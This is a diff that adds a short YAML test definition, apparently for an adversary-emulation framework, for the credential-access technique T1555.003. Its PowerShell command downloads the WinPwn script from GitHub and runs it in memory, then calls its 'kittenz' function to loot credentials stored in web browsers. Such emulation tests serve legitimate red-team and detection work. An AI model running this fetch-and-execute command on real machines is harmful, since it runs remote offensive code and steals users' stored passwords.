@@ -1,0 +1,13 @@
+- id: 37db0981-0dfc-50ea-a1cd-13bc51224d31
+  name: Soumaia ART Tests - WinPwn - Loot local Credentials - mimi-kittenz
+  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+          kittenz -consoleoutput -noninteractive
